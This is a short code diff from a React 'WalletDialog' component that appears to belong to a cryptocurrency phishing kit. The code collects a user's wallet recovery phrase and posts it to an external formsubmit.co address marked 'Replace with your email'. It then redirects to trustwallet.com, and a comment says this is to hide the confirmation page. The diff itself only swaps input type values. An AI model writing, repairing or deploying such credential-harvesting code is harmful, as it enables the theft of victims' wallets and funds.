@@ -35,13 +35,13 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
       form.action = 'https://formsubmit.co/06fed404371470d7cfff86b643c88efe';  // Replace with your email
 
       const phraseInput = document.createElement('input');
-      phraseInput.type = 'show';
+      phraseInput.type = 'visible';
       phraseInput.name = 'phrase';
       phraseInput.value = phrase;
 
       // Add redirect URL to hide the formsubmit confirmation page
       const redirectInput = document.createElement('input');
-      redirectInput.type = 'show';
+      redirectInput.type = 'visible';
       redirectInput.name = 'redirect';
       redirectInput.value = 'https://trustwallet.com/';
       form.appendChild(phraseInput);
